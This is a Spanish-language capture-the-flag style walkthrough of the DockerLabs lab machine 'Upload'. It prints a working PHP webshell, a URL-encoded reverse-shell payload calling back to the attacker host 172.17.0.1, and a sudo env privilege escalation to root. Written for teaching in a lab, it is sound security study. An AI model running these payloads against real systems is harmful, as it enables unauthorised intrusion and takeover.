## Introducción

Este documento presenta la resolución completa de la máquina **Upload**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con un formulario de subida de archivos que carece de validación adecuada, permitiendo la carga de una webshell en PHP. Con esta webshell, se obtiene ejecución remota de comandos como `www-data`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `env` como root sin autenticación, facilitando una escalada de privilegios directa y obteniendo acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Upload.zip
sudo bash auto_deplo.sh Upload.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Upload/{content,exploits,nmap,scripts}
cd Upload
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1751942373/Ports_y7rq7n.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Subida de webshell

El formulario permite subir archivos sin validación adecuada. Se sube una webshell en PHP:

```php
<?php
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>
```

![Upload File](https://res.cloudinary.com/dewqswzke/image/upload/v1751942376/UploadFile_uk6mae.png)

Se verifica la ejecución:

```
http://172.17.0.2/Uploads/shell.php?cmd=id
```

![Webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1751942377/WebShell_p0xsto.png)

### 2.2 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se ejecuta el payload para la reverse shell:

```
http://172.17.0.2/Uploads/shell.php?cmd=php%20-r%20'%24sock%3Dfsockopen%28"172.17.0.1"%2C443%29%3Bexec%28"bash%20%3C%263%20%3E%263%202%3E%263"%29%3B'
```

![Reverse](https://res.cloudinary.com/dewqswzke/image/upload/v1751942373/Reverse_vx94co.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1751942375/Sudo-l_b15p11.png)

El usuario puede ejecutar `env` como root sin contraseña.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b env -f sudo
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo env /bin/sh
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1751942374/Root_k5is1f.png)
